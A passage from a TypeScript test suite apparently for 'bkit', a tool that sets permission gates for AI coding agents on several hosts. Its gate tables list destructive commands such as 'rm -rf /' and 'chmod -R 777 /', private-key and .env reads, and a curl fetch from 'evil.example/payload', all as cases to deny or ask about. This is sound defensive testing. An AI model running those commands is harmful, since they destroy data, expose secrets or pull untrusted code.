      "git rebase -i",
      "gh repo delete",
      "gh pr close",
      "gh release delete",
    ]) {
      const gatedHere = [...gated].some((p) => p.startsWith(`Bash(${cmd}`));
      expect(gatedHere, `Bash(${cmd}...) must be gated on the Claude host too`).toBe(true);
    }
    // The exemption is exactly two rules wide.
    for (const cmd of ["curl", "wget"]) {
      const gatedHere = [...gated].some((p) => p.startsWith(`Bash(${cmd}`));
      expect(gatedHere, `Bash(${cmd}...) is the documented exemption — should NOT be gated`).toBe(
        false,
      );
    }
  });

  it("injects consumer allowed-domains as curl/wget allows (stack-agnostic)", () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "bkit-net-"));
    fs.mkdirSync(path.join(tmp, ".agents"), { recursive: true });
    fs.writeFileSync(
      path.join(tmp, ".agents", "context.md"),
      "<!-- bkit:end -->\n<!-- allowed-domains:start -->\nvercel.com\nsupabase.com\n<!-- allowed-domains:end -->\n",
      "utf-8",
    );
    const parsed = JSON.parse(renderOpencodeJson(TEMPLATE, "github", "openrouter", tmp));
    expect(parsed.permission.bash["curl *vercel.com*"]).toBe("allow");
    expect(parsed.permission.bash["wget *supabase.com*"]).toBe("allow");
    fs.rmSync(tmp, { recursive: true, force: true });
  });

  it("ollama: npm driver, cloud baseURL, apiKey via {env:BKIT_OLLAMA_API_KEY}", () => {
    const parsed = JSON.parse(renderOpencodeJson(TEMPLATE, "github", "ollama"));
    const block = parsed.provider?.["ollama"];
    expect(block).toBeTruthy();
    expect(block.api).toBeUndefined();
    expect(block.npm).toBe("@ai-sdk/openai-compatible");
    expect(block.options.baseURL).toBe("https://ollama.com/v1");
    expect(block.options.apiKey).toBe("{env:BKIT_OLLAMA_API_KEY}");
  });

  it("opencode-zen / opencode-go: built-in providers (apiKey only — no npm/baseURL)", () => {
    // OpenCode resolves Zen/Go from models.dev (per-model openai-compatible vs anthropic).
    // Seeding npm+baseURL forces every model through /chat/completions and breaks Qwen/MiniMax
    // (Anthropic /messages) → wrong-URL errors. Built-in shape: options.apiKey only.
    const cases = [
      ["opencode-zen", "opencode"],
      ["opencode-go", "opencode-go"],
    ] as const;
    for (const [cliKey, blockKey] of cases) {
      const parsed = JSON.parse(renderOpencodeJson(TEMPLATE, "github", cliKey));
      const block = parsed.provider?.[blockKey];
      expect(block, `${cliKey} → provider.${blockKey}`).toBeDefined();
      expect(block.api).toBeUndefined();
      expect(block.npm).toBeUndefined();
      expect(block.name).toBeUndefined();
      expect(block.options?.baseURL).toBeUndefined();
      expect(block.options?.apiKey).toBe("{env:BKIT_OPENCODE_API_KEY}");
      expect(Object.keys(block)).toEqual(["options"]);
      expect(parsed.plugin).toContain(".opencode/plugin/gateguard.js");
      expect(JSON.stringify(parsed)).not.toContain("@@OPENCODE");
    }
    // Zen CLI key must NOT invent a custom `opencode-zen` block — models.dev id is `opencode`.
    const zen = JSON.parse(renderOpencodeJson(TEMPLATE, "github", "opencode-zen"));
    expect(zen.provider?.["opencode-zen"]).toBeUndefined();
    expect(zen.provider?.opencode).toBeDefined();
  });
});

// ---------------------------------------------------------------------------
// reconcileOpencodeJson — provider-key ordering is stable across paths: install
// reconciles only the ACTIVE provider, upgrade also reconciles each ADDITIONAL
// installed provider, and both render the same order.
// ---------------------------------------------------------------------------
describe("reconcileMcpJson — bkit owns only its tracker entry", () => {
  const scriptsDir = import.meta.dirname ?? path.dirname(new URL(import.meta.url).pathname);
  const template = path.resolve(scriptsDir, "..", "..", "..", "..", "templates", ".mcp.json");
  const githubEntry = (
    JSON.parse(fs.readFileSync(template, "utf-8")) as { mcpServers: Record<string, unknown> }
  ).mcpServers.github;
  const write = (doc: unknown) =>
    fs.writeFileSync(path.join(tmpDir, ".mcp.json"), JSON.stringify(doc, null, 2) + "\n");
  const read = () => JSON.parse(fs.readFileSync(path.join(tmpDir, ".mcp.json"), "utf-8"));

  it("absent file → writes the tracker-filtered render", () => {
    const ws = makeWriteSet();
    reconcileMcpJson(template, ".mcp.json", "github", false, ws);
    expect(read()).toEqual({ mcpServers: { github: githubEntry } });
    expect(ws.writes).toEqual([{ path: ".mcp.json", action: "write" }]);
  });

  it("keeps a consumer server and other keys, updates bkit's entry, keeps key order", () => {
    const mine = { type: "stdio", command: "my-mcp" };
    write({ theme: "x", mcpServers: { mine, github: { url: "https://edited" } } });
    const ws = makeWriteSet();
    reconcileMcpJson(template, ".mcp.json", "github", false, ws);
    const after = read();
    expect(after).toEqual({ theme: "x", mcpServers: { mine, github: githubEntry } });
    expect(Object.keys(after.mcpServers)).toEqual(["mine", "github"]);
    expect(ws.writes).toEqual([{ path: ".mcp.json", action: "update" }]);
  });

  it("in sync → no write; dry-run reports the same write as live without touching disk", () => {
    write({ mcpServers: { github: githubEntry, mine: {} } });
    const inSync = makeWriteSet();
    reconcileMcpJson(template, ".mcp.json", "github", false, inSync);
    expect(inSync.writes).toEqual([]);

    write({ mcpServers: { github: { url: "https://edited" } } });
    const before = fs.readFileSync(path.join(tmpDir, ".mcp.json"), "utf-8");
    const dry = makeWriteSet();
    reconcileMcpJson(template, ".mcp.json", "github", true, dry);
    expect(fs.readFileSync(path.join(tmpDir, ".mcp.json"), "utf-8")).toBe(before);
    const live = makeWriteSet();
    reconcileMcpJson(template, ".mcp.json", "github", false, live);
    expect(live.writes).toEqual(dry.writes);
  });

  it("tracker none owns no entry → a present file is left alone", () => {
    write({ mcpServers: { linear: { url: "https://mine" } } });
    const ws = makeWriteSet();
    reconcileMcpJson(template, ".mcp.json", "none", false, ws);
    expect(ws.writes).toEqual([]);
    expect(read()).toEqual({ mcpServers: { linear: { url: "https://mine" } } });
  });

  it("malformed JSON throws and leaves the file as it was", () => {
    fs.writeFileSync(path.join(tmpDir, ".mcp.json"), "{ nope", "utf-8");
    expect(() => reconcileMcpJson(template, ".mcp.json", "github", false, makeWriteSet())).toThrow(
      /malformed JSON/,
    );
    expect(fs.readFileSync(path.join(tmpDir, ".mcp.json"), "utf-8")).toBe("{ nope");
  });
});

describe.each([
  [
    path.join(".agents", "context.md"),
    "\n## Enabled blocks\n\n<!-- context-fetch:start ours context=web -->\n```bash\necho ours\n```\n<!-- context-fetch:end -->\n",
  ],
  [path.join(".agents", "skills.md"), "\n## Project Skills\n\n| `ours/skills` | ours | ours |\n"],
])("%s — bkit owns the managed block, the consumer owns the rest", (REL, CONSUMER) => {
  it("install rewrites a stale block and keeps everything below bkit:end byte-identical", () => {
    const first = makeCtx();
    runCoreModule(first);
    flushPostDispatch(first);
    const abs = path.join(tmpDir, REL);
    const fresh = fs.readFileSync(abs, "utf-8");
    expect(fresh).toContain("<!-- bkit:end -->");
    expect(first.ws.writes.some((w) => path.normalize(w.path) === REL)).toBe(true);

    // The block's own rules quote the end marker, so the real one is the last.
    const endIdx = fresh.lastIndexOf("<!-- bkit:end -->");
    const managed = fresh.slice(0, endIdx + "<!-- bkit:end -->".length);
    fs.writeFileSync(
      abs,
      `${fresh.slice(0, endIdx)}stale rule\n<!-- bkit:end -->${CONSUMER}`,
      "utf-8",
    );

    const again = makeCtx();
    runCoreModule(again);
    const after = fs.readFileSync(abs, "utf-8");
    expect(after).toBe(managed + CONSUMER);
    expect(again.ws.writes.some((w) => path.normalize(w.path) === REL)).toBe(true);
  });
});

describe("reconcileOpencodeJson — preserves existing provider order", () => {
  const DST = path.join(".opencode", "opencode.json");

  function seed(providers: Record<string, unknown>): void {
    fs.mkdirSync(".opencode", { recursive: true });
    fs.writeFileSync(
      DST,
      JSON.stringify({ plugin: [".opencode/plugin/gateguard.js"], provider: providers }, null, 2) +
        "\n",
      "utf-8",
    );
  }
  function providerOrder(): string[] {
    const parsed = JSON.parse(fs.readFileSync(DST, "utf-8")) as {
      provider: Record<string, unknown>;
    };
    return Object.keys(parsed.provider);
  }

  it("reconciling a LATER provider's block keeps the existing key order (upgrade path)", () => {
    seed({
      "opencode-go": { options: { apiKey: "{env:BKIT_OPENCODE_API_KEY}" } },
      openrouter: { npm: "@ai-sdk/openai-compatible", name: "OpenRouter", options: {} },
    });
    // The "additional provider" reconcile on upgrade seeds ONLY openrouter.
    const openrouterTemplate = JSON.stringify({
      provider: {
        openrouter: {
          npm: "@ai-sdk/openai-compatible",
          name: "OpenRouter",
          options: {
            baseURL: "https://integrate.api.openrouter.com/v1",
            apiKey: "{env:BKIT_OPENROUTER_API_KEY}",
          },
        },
      },
    });
    reconcileOpencodeJson(openrouterTemplate, DST, false, makeWriteSet());
    expect(providerOrder()).toEqual(["opencode-go", "openrouter"]);
  });

  it("appends a genuinely-new template provider AFTER the existing ones", () => {
    seed({ "opencode-go": { options: {} } });
    const ollamaTemplate = JSON.stringify({
      provider: { openrouter: { npm: "@ai-sdk/openai-compatible", name: "Ollama", options: {} } },
    });
    reconcileOpencodeJson(ollamaTemplate, DST, false, makeWriteSet());
    expect(providerOrder()).toEqual(["opencode-go", "openrouter"]);
  });
});

// ---------------------------------------------------------------------------
// gateguard markered-text — install engine, for both the claude and opencode twins.
// ---------------------------------------------------------------------------

describe("gateguard.cjs / gateguard.js markered-text — install engine (#422)", () => {
  const CJS_REL = path.join(".claude", "hooks", "gateguard.cjs");
  const JS_REL = path.join(".opencode", "plugin", "gateguard.js");

  // Resolve the real opencode model lookup from prompts.md (same source used at install
  // time) — runOpencodeModule's agent/command render pass requires it populated.
  const PROMPTS_MD = path.resolve(
    import.meta.dirname ?? path.dirname(new URL(import.meta.url).pathname),
    "..",
    "..",
    "..",
    "..",
    "prompts.md",
  );
  const OPENCODE_MODEL_LOOKUP = buildOpencodeModelLookup(PROMPTS_MD, "opencode-zen");
  const EFFORT_MAP = parseEffortMap(PROMPTS_MD);

  function makeOpencodeCtx(overrides: Partial<ModuleContext> = {}): ModuleContext {
    return makeCtx({
      opencodeModelLookup: OPENCODE_MODEL_LOOKUP,
      effortMap: EFFORT_MAP,
      opencodeProvider: "ollama",
      ...overrides,
    });
  }

  it("fresh install (no file) writes both hooks with slash-comment markers", () => {
    const ctx = makeCtx();
    runClaudeModule(ctx);
    runOpencodeModule(makeOpencodeCtx());

    const cjs = fs.readFileSync(path.join(tmpDir, CJS_REL), "utf-8");
    expect(cjs).toContain("// bkit:start");
    expect(cjs).toContain("// bkit:end");
    const js = fs.readFileSync(path.join(tmpDir, JS_REL), "utf-8");
    expect(js).toContain("// bkit:start");
    expect(js).toContain("// bkit:end");
  });
});

// ---------------------------------------------------------------------------
// modules-upgrade
// ---------------------------------------------------------------------------
// modules-upgrade — upgrade survival of consumer keys
//
// Tests that consumer-added keys in .claude/settings.json, .cursor/hooks.json and
// .opencode/opencode.json survive writeTier2JsonContained.
//
// Fixture: tests/fixtures/heavy-customised-consumer/
describe("modules-upgrade", () => {
  // ---------------------------------------------------------------------------
  // Helpers
  // ---------------------------------------------------------------------------

  let tmpDir: string;
  let originalCwd: string;

  const FIXTURE_DIR = path.resolve(
    __dirname,
    "../../../../../tests/fixtures/heavy-customised-consumer",
  );

  function makeWriteSet(): WriteSet {
    return { writes: [] };
  }

  beforeEach(() => {
    originalCwd = process.cwd();
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "bkit-upgrade-integ-"));
    process.chdir(tmpDir);
  });

  afterEach(() => {
    process.chdir(originalCwd);
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  // ---------------------------------------------------------------------------
  // Heavy-customised consumer fixture survival (BAR-131 fixture)
  // Task 9: heavy-customised consumer fixture survival
  // ---------------------------------------------------------------------------

  describe("heavy-customised consumer fixture — contained write", () => {
    it("fixture directory exists", () => {
      expect(fs.existsSync(FIXTURE_DIR), `Fixture missing at ${FIXTURE_DIR}`).toBe(true);
    });

    it("consumer Stop hook survives writeTier2JsonContained", () => {
      // A consumer that added its own Stop hook and a custom key
      const onDiskPath = path.join(tmpDir, "settings.json");
      const consumerDoc = {
        $schema: "https://json.schemastore.org/claude-code-settings.json",
        hooks: {
          SessionStart: [{ hooks: [{ type: "command", command: "bash preflight.sh" }] }],
          Stop: [{ hooks: [{ type: "command", command: "echo 'Consumer Stop hook'" }] }],
        },
        customKey: "consumer-value",
      };
      fs.writeFileSync(onDiskPath, JSON.stringify(consumerDoc, null, 2) + "\n", "utf-8");

      const templatePath = path.join(tmpDir, "template.json");
      const template = {
        $schema: "https://json.schemastore.org/claude-code-settings.json",
        hooks: { SessionStart: [{ hooks: [{ type: "command", command: "bash preflight.sh" }] }] },
      };
      fs.writeFileSync(templatePath, JSON.stringify(template, null, 2) + "\n", "utf-8");

      const ws = makeWriteSet();
      writeTier2JsonContained(templatePath, onDiskPath, false, ws);

      const afterDoc = JSON.parse(fs.readFileSync(onDiskPath, "utf-8"));
      expect(afterDoc["__bkit__"]).toBeUndefined();
      // Consumer Stop hook survived
      expect(afterDoc.hooks.Stop).toBeDefined();
      expect(JSON.stringify(afterDoc.hooks.Stop)).toContain("Consumer Stop hook");
      // consumer-only key survived
      expect(afterDoc.customKey).toBe("consumer-value");
    });
  });

  // ---------------------------------------------------------------------------
  // Cursor v1 keyed-object schema sanity (Task 8, cursor-v1-schema block)
  // ---------------------------------------------------------------------------

  describe("cursor-v1-schema sanity", () => {
    it("template has version===1, hooks.sessionStart/sessionStop arrays, no __bkit__", () => {
      const templatePath = path.resolve(__dirname, "../../../../templates/.cursor/hooks.json");
      expect(fs.existsSync(templatePath)).toBe(true);
      const doc = JSON.parse(fs.readFileSync(templatePath, "utf-8"));
      expect(doc.version).toBe(1);
      expect(Array.isArray(doc.hooks.sessionStart)).toBe(true);
      expect(Array.isArray(doc.hooks.sessionStop)).toBe(true);
      expect(doc["__bkit__"]).toBeUndefined();
      // No flat-array hooks
      expect(Array.isArray(doc.hooks)).toBe(false);
    });
  });

  // ---------------------------------------------------------------------------
  // opencode reconverge on upgrade (sub-plan 4)
  // Tests that consumer keys in opencode.json survive writeTier2JsonContained
  // while bkit-managed keys are reconverged.
  // ---------------------------------------------------------------------------

  describe("opencode opencode.json reconverge on upgrade", () => {
    it("consumer-added provider key survives writeTier2JsonContained; bkit plugins key reconverged", () => {
      // Template = bkit's managed opencode.json shape
      const templatePath = path.join(tmpDir, "opencode-template.json");
      const template = {
        provider: {
          ollama: {
            npm: "@ai-sdk/openai-compatible",
            name: "Ollama (Local)",
            options: { baseURL: "http://localhost:11434/v1" },
          },
        },
        plugins: [".opencode/plugin/gateguard.js"],
      };
      fs.writeFileSync(templatePath, JSON.stringify(template, null, 2) + "\n", "utf-8");

      // Consumer's existing opencode.json — has bkit-managed keys PLUS consumer additions
      const consumerPath = path.join(tmpDir, "opencode.json");
      const consumerDoc = {
        provider: {
          ollama: {
            npm: "@ai-sdk/openai-compatible",
            name: "Ollama (Local)",
            options: { baseURL: "http://localhost:11434/v1" },
          },
          // Consumer added their own (non-bkit) provider — must survive reconverge
          customllm: {
            options: { baseURL: "https://llm.internal.example/v1" },
            apiKey: "${CUSTOMLLM_API_KEY}",
          },
        },
        // Consumer added their own mcp config
        mcp: { myServer: { command: "npx", args: ["-y", "my-mcp-server"] } },
        plugins: [".opencode/plugin/gateguard.js"],
      };
      fs.writeFileSync(consumerPath, JSON.stringify(consumerDoc, null, 2) + "\n", "utf-8");

      const ws: WriteSet = { writes: [] };
      writeTier2JsonContained(templatePath, consumerPath, false, ws);

      const afterDoc = JSON.parse(fs.readFileSync(consumerPath, "utf-8"));

      // bkit ollama provider still present (reconverged)
      expect(afterDoc.provider?.["ollama"]?.options?.baseURL).toBe("http://localhost:11434/v1");
      // Consumer's custom (non-bkit) provider preserved
      expect(afterDoc.provider?.customllm?.apiKey).toBe("${CUSTOMLLM_API_KEY}");
      // Consumer's mcp config preserved
      expect(afterDoc.mcp?.myServer?.command).toBe("npx");
      // Plugin still wired
      expect(afterDoc.plugins).toContain(".opencode/plugin/gateguard.js");
    });

    it("opencode.json reconverge is idempotent", () => {
      const templatePath = path.join(tmpDir, "opencode-template.json");
      const template = {
        provider: {
          ollama: {
            npm: "@ai-sdk/openai-compatible",
            name: "Ollama (Local)",
            options: { baseURL: "http://localhost:11434/v1" },
          },
        },
        plugins: [".opencode/plugin/gateguard.js"],
      };
      fs.writeFileSync(templatePath, JSON.stringify(template, null, 2) + "\n", "utf-8");

      const consumerPath = path.join(tmpDir, "opencode.json");
      const consumerDoc = {
        provider: {
          ollama: {
            npm: "@ai-sdk/openai-compatible",
            name: "Ollama (Local)",
            options: { baseURL: "http://localhost:11434/v1" },
          },
        },
        plugins: [".opencode/plugin/gateguard.js"],
        customKey: "consumer-value",
      };
      fs.writeFileSync(consumerPath, JSON.stringify(consumerDoc, null, 2) + "\n", "utf-8");

      const ws1: WriteSet = { writes: [] };
      writeTier2JsonContained(templatePath, consumerPath, false, ws1);
      expect(ws1.writes).toHaveLength(0); // already contained — no-op

      const ws2: WriteSet = { writes: [] };
      writeTier2JsonContained(templatePath, consumerPath, false, ws2);
      expect(ws2.writes).toHaveLength(0); // still no-op
    });
  });
});

// ---------------------------------------------------------------------------
// permissions-parity
// ---------------------------------------------------------------------------
// permissions-parity — one canonical gate set, asserted against every host.
//
// An agent is held to the same rules whichever IDE runs it. The four hosts express
// gates in four different languages:
//
//   Claude   .claude/settings.json          permissions.deny / .ask  — prefix patterns
//   opencode .opencode/opencode.json        permission.bash / .read  — globs, last-match-wins
//   Cursor   .cursor/hooks/guardrails.cjs                            — regexes in a script
//   Codex    .codex/hooks/guardrails.cjs                             — same engine, Claude-family envelope
//
// This file is the single table they all satisfy: a gate added here fails every host
// that lacks it.
//
// Codex carries ONE structural exception: it parses
// `permissionDecision: "ask"` but does not implement it, so its ask tier is advisory
// `additionalContext` — the gate fires and informs, it cannot stop the command. Deny
// blocks for real on all four.
describe("permissions-parity", () => {
  const CLAUDE_SETTINGS = ".bkit/templates/.claude/settings.json";
  const OPENCODE_JSON = ".bkit/templates/.opencode/opencode.json";
  const GUARDRAILS = path.resolve(".bkit/templates/.cursor/hooks/guardrails.cjs");
  const CODEX_GUARDRAILS = path.resolve(".bkit/templates/.codex/hooks/guardrails.cjs");

  type Verdict = "deny" | "ask" | "allow";

  /** The canonical gate set. One row = one behaviour every host must implement. */
  const SHELL_GATES: { cmd: string; expect: Verdict; why: string }[] = [
    { cmd: "rm -rf /", expect: "deny", why: "recursive delete of the filesystem root" },
    { cmd: "rm -rf ~/*", expect: "deny", why: "recursive delete of home" },
    { cmd: "rm -rf $HOME/*", expect: "deny", why: "recursive delete of home" },
    { cmd: "chmod -R 777 /", expect: "deny", why: "world-writable filesystem root" },
    { cmd: "git push --force origin main", expect: "deny", why: "force-push" },
    { cmd: "git push -f origin main", expect: "deny", why: "force-push, short flag" },
    {
      cmd: "git push --force-with-lease origin feat",
      expect: "allow",
      why: "lease-guarded push is permitted on personal branches by rules.md — the one force variant that must NOT be denied",
    },
    { cmd: "sudo rm x", expect: "ask", why: "privilege escalation" },
    { cmd: "brew install jq", expect: "ask", why: "system package install" },
    { cmd: "pnpm publish", expect: "ask", why: "package publish" },
    { cmd: "npm publish", expect: "ask", why: "package publish" },
    { cmd: "bun publish", expect: "ask", why: "package publish" },
    { cmd: "git reset --hard HEAD~1", expect: "ask", why: "discards working tree" },
    { cmd: "git clean -fd", expect: "ask", why: "deletes untracked files" },
    { cmd: "git clean -fdx", expect: "ask", why: "deletes untracked and ignored files" },
    { cmd: "git filter-branch --tree-filter x", expect: "ask", why: "rewrites history" },
    { cmd: "git checkout -- .", expect: "ask", why: "discards all unstaged changes" },
    { cmd: "git restore .", expect: "ask", why: "discards all unstaged changes" },
    { cmd: "git stash drop", expect: "ask", why: "destroys stashed work" },
    { cmd: "git rebase -i HEAD~3", expect: "ask", why: "interactive history rewrite" },
    { cmd: "gh repo delete o/r", expect: "ask", why: "destroys a repository" },
    { cmd: "gh pr close 1", expect: "ask", why: "closes someone's PR" },
    { cmd: "gh release delete v1", expect: "ask", why: "destroys a release" },
  ];

  const READ_GATES: { file: string; expect: Verdict; why: string }[] = [
    { file: "certs/server.pem", expect: "deny", why: "private-key material" },
    { file: "certs/client.p12", expect: "deny", why: "private-key material" },
    { file: "~/.ssh/id_rsa", expect: "deny", why: "private-key material" },
    { file: ".env", expect: "ask", why: "secrets" },
    { file: ".env.local", expect: "ask", why: "secrets" },
    { file: ".bkit/.env", expect: "ask", why: "bkit tooling secrets" },
    { file: ".env.example", expect: "allow", why: "documented non-secret template" },
  ];

  // ---------------------------------------------------------------------------
  // Host adapters — each returns the verdict that host would reach.
  // ---------------------------------------------------------------------------

  function claudePermissions(): { deny: string[]; ask: string[]; allow: string[] } {
    const p = JSON.parse(fs.readFileSync(CLAUDE_SETTINGS, "utf-8")).permissions;
    return { deny: p.deny ?? [], ask: p.ask ?? [], allow: p.allow ?? [] };
  }

  /** Claude patterns are `Bash(prefix)` / `Bash(prefix *)` / `Bash(prefix:*)`. */
  function claudeShellVerdict(cmd: string): Verdict {
    const p = claudePermissions();
    const matches = (entries: string[]) =>
      entries.some((raw) => {
        const m = /^Bash\((.*)\)$/.exec(raw);
        if (!m) return false;
        const pat = m[1]!;
        if (pat.endsWith(":*")) return cmd.startsWith(pat.slice(0, -2));
        if (pat.endsWith(" *")) return cmd.startsWith(pat.slice(0, -1));
        if (pat.endsWith("*")) return cmd.startsWith(pat.slice(0, -1));
        return cmd === pat;
      });
    // deny wins over ask, ask over allow — the strictest match decides.
    if (matches(p.deny)) return "deny";
    if (matches(p.ask)) return "ask";
    return "allow";
  }

  function globToRe(glob: string): RegExp {
    const esc = glob.replace(/[.+^${}()|[\]\\]/g, "\\$&").replace(/\*/g, ".*");
    return new RegExp(`^${esc}$`);
  }

  /** opencode's map is glob-keyed and LAST match wins. */
  function opencodeVerdict(section: "bash" | "read", subject: string): Verdict {
    const perm = JSON.parse(fs.readFileSync(OPENCODE_JSON, "utf-8")).permission;
    const table = perm[section] as Record<string, Verdict>;
    let verdict: Verdict = "allow";
    for (const [glob, v] of Object.entries(table)) {
      if (globToRe(glob).test(subject)) verdict = v;
    }
    return verdict;
  }

  function cursorVerdict(payload: unknown): Verdict {
    const res = spawnSync("node", [GUARDRAILS], {
      input: JSON.stringify(payload),
      encoding: "utf-8",
    });
    return (JSON.parse(res.stdout.trim()) as { permission: Verdict }).permission;
  }

  /**
   * Codex speaks the Claude-family hook contract and cannot prompt: it parses
   * `permissionDecision: "ask"` but does not implement it. bkit emits the ask tier as
   * advisory `additionalContext`, mapped back to "ask" here.
   *
   * Silence (no stdout) is allow: the engine returns null when it has no opinion.
   */
  function codexVerdict(cmd: string): Verdict {
    const res = spawnSync("node", [CODEX_GUARDRAILS], {
      input: JSON.stringify({ tool_name: "Bash", tool_input: { command: cmd } }),
      encoding: "utf-8",
    });
    const out = res.stdout.trim();
    if (!out) return "allow";
    const hso = (JSON.parse(out) as { hookSpecificOutput: Record<string, string> })
      .hookSpecificOutput;
    if (hso.permissionDecision === "deny") return "deny";
    return hso.additionalContext ? "ask" : "allow";
  }

  // ---------------------------------------------------------------------------
  // The assertions
  // ---------------------------------------------------------------------------

  describe("cross-host gate parity — shell", () => {
    for (const g of SHELL_GATES) {
      it(`${g.expect.toUpperCase()} on \`${g.cmd}\` (${g.why}) — all four hosts`, () => {
        expect({ host: "claude", v: claudeShellVerdict(g.cmd) }).toEqual({
          host: "claude",
          v: g.expect,
        });
        expect({ host: "opencode", v: opencodeVerdict("bash", g.cmd) }).toEqual({
          host: "opencode",
          v: g.expect,
        });
        expect({ host: "cursor", v: cursorVerdict({ command: g.cmd }) }).toEqual({
          host: "cursor",
          v: g.expect,
        });
        expect({ host: "codex", v: codexVerdict(g.cmd) }).toEqual({
          host: "codex",
          v: g.expect,
        });
      });
    }
  });

  // Three hosts, not four: the Codex guardrail is registered on the shell tool only.
  // Tracked in docs/deferrals.jsonl →
  // `codex-read-tier-gates-not-wired-file-read-tool-name-unverified`.
  // Shell-level reads (`cat .env`) are covered by no host's read tier.
  describe("cross-host gate parity — file reads", () => {
    for (const g of READ_GATES) {
      it(`${g.expect.toUpperCase()} on reading \`${g.file}\` (${g.why}) — claude/opencode/cursor`, () => {
        expect({ host: "opencode", v: opencodeVerdict("read", g.file) }).toEqual({
          host: "opencode",
          v: g.expect,
        });
        expect({
          host: "cursor",
          v: cursorVerdict({ tool_name: "Read", tool_input: { path: g.file } }),
        }).toEqual({ host: "cursor", v: g.expect });
      });
    }
  });

  // ---------------------------------------------------------------------------
  // Shell-as-edit-channel
  // ---------------------------------------------------------------------------
  //
  // `.agents/rules.md` § Code Changes ("change file contents with edit/write tools").
  // The gate is ADVISORY on all three script hosts, never a block.
  //
  // opencode is absent — a glob-keyed table cannot parse a redirect target. Tracked in
  // docs/deferrals.jsonl → `opencode-has-no-script-hook-so-two-gates-are-inexpressible-there`.
  const CLAUDE_GUARDRAILS = path.resolve(".bkit/templates/.claude/hooks/guardrails.cjs");

  function advisoryText(host: "claude" | "codex" | "cursor", cmd: string): string {
    const script = { claude: CLAUDE_GUARDRAILS, codex: CODEX_GUARDRAILS, cursor: GUARDRAILS }[host];
    const payload =
      host === "cursor" ? { command: cmd } : { tool_name: "Bash", tool_input: { command: cmd } };
    const res = spawnSync("node", [script], {
      input: JSON.stringify(payload),
      encoding: "utf-8",
    });
    const out = res.stdout.trim();
    if (!out) return "";
    const doc = JSON.parse(out) as {
      permission?: string;
      agent_message?: string;
      hookSpecificOutput?: { additionalContext?: string; permissionDecision?: string };
    };
    if (host === "cursor") {
      // A block would show up as a non-allow permission — assert it never does.
      expect(doc.permission).toBe("allow");
      return doc.agent_message ?? "";
    }
    expect(doc.hookSpecificOutput?.permissionDecision).toBeUndefined();
    return doc.hookSpecificOutput?.additionalContext ?? "";
  }

  const HOSTS = ["claude", "codex", "cursor"] as const;

  describe("shell-as-edit-channel — advisory on every script host", () => {
    const FLAGGED = [
      { cmd: 'sed -i.bak -E "s|a|b|g" plan.md', why: "in-place sed, the shape bkit-plan.md uses" },
      { cmd: "sed -i s/a/b/ src/app.ts", why: "in-place sed, GNU form" },
      { cmd: "perl -i -pe s/a/b/ src/app.js", why: "in-place perl" },
      { cmd: "echo hi > notes.md", why: "redirect into a source file" },
      { cmd: "cat tpl > src/generated.ts", why: "redirect into a source file" },
    ];

    for (const { cmd, why } of FLAGGED) {
      it(`ADVISES on \`${cmd}\` (${why}) — and never blocks`, () => {
        for (const host of HOSTS) {
          expect({
            host,
            advised: advisoryText(host, cmd).includes("edits files through the shell"),
          }).toEqual({ host, advised: true });
        }
      });
    }

    // A gate that fires on ordinary shell plumbing gets disabled, so silence here is a
    // load-bearing property, not an omission.
    const SILENT = [
      { cmd: "echo hi > /dev/null", why: "the single most common redirect there is" },
      { cmd: 'echo "K=v" >> "$GITHUB_ENV"', why: "CI env handoff" },
      { cmd: "grep x foo > /tmp/out.txt", why: "scratch file" },
      { cmd: "pnpm test 2> err.log", why: "log capture, and a numbered fd" },
      { cmd: "pnpm build && node dist/x.js", why: "no redirect at all" },
      { cmd: "git status --porcelain", why: "plain read" },
    ];

    for (const { cmd, why } of SILENT) {
      it(`stays SILENT on \`${cmd}\` (${why})`, () => {
        for (const host of HOSTS) {
          expect({ host, text: advisoryText(host, cmd) }).toEqual({ host, text: "" });
        }
      });
    }

    it("the sanctioned bulk rewrite in bkit-plan.md is advised but NOT blocked", () => {
      const planCmd = fs
        .readFileSync(".bkit/workflows/bkit-plan.md", "utf-8")
        .split("\n")
        .find((l) => l.includes("sed -i"));
      expect(planCmd, "bkit-plan.md no longer contains the sed -i this test pins").toBeDefined();
      for (const host of HOSTS) {
        // advisoryText asserts "never blocks" internally for each host.
        expect({ host, advised: advisoryText(host, planCmd!.trim()).length > 0 }).toEqual({
          host,
          advised: true,
        });
      }
    });
  });

  describe("cross-host gate parity — curl / wget in a shell", () => {
    // Every host allows a fetch to an ALLOWLISTED host with no interruption — the common
    // path, and the one context-fetch blocks take. They differ only on an UNDECLARED host:
    //
    //   Cursor    asks   — parses the URL host in guardrails.cjs
    //   opencode  asks   — `curl *: ask` + `curl *{domain}*: allow`, substring not host-parsed
    //   Claude    advises — a permission table cannot match a URL host
    //   Codex     advises — parses `permissionDecision: "ask"` but does not implement it
    //
    // No SHELL_GATES row: that table asserts ONE verdict across all four.
    const ALLOWED = "curl -fsSL https://api.github.com/repos/x/y";
    const UNDECLARED = "curl -fsSL https://evil.example/payload";

    it("allowlisted host: no interruption on any host that resolves the allowlist", () => {
      expect({ host: "cursor", v: cursorVerdict({ command: ALLOWED }) }).toEqual({
        host: "cursor",
        v: "allow",
      });
      // opencode is asserted against the TEMPLATE, which carries only the `curl *: ask`
      // base. Its per-domain `curl *{domain}*: allow` rows are injected at install time
      // from the consumer's resolved allowlist (injectOpencodeDerivedAllows), and the
      // rendered result is covered in install/modules/index.integration.test.ts. So "ask" here is
      // the template's honest verdict, not a gap in the host.
      expect({ host: "opencode(template)", v: opencodeVerdict("bash", ALLOWED) }).toEqual({
        host: "opencode(template)",
        v: "ask",
      });
      expect({ host: "claude", advised: advisoryText("claude", ALLOWED) }).toEqual({
        host: "claude",
        advised: "",
      });
      expect({ host: "codex", v: codexVerdict(ALLOWED) }).toEqual({ host: "codex", v: "allow" });
    });

    it("undeclared host: Cursor/opencode ask, Claude/Codex advise — nobody silently allows", () => {
      expect({ host: "cursor", v: cursorVerdict({ command: UNDECLARED }) }).toEqual({
        host: "cursor",
        v: "ask",
      });
      expect({ host: "opencode", v: opencodeVerdict("bash", UNDECLARED) }).toEqual({
        host: "opencode",
        v: "ask",
      });
      expect({
        host: "claude",
        flagged: advisoryText("claude", UNDECLARED).includes(
          "not on this repo's network allowlist",
        ),
      }).toEqual({ host: "claude", flagged: true });
      expect({ host: "codex", v: codexVerdict(UNDECLARED) }).toEqual({ host: "codex", v: "ask" });
    });

    it("the allowlist is host-matched, not substring-matched, on every host that parses it", () => {
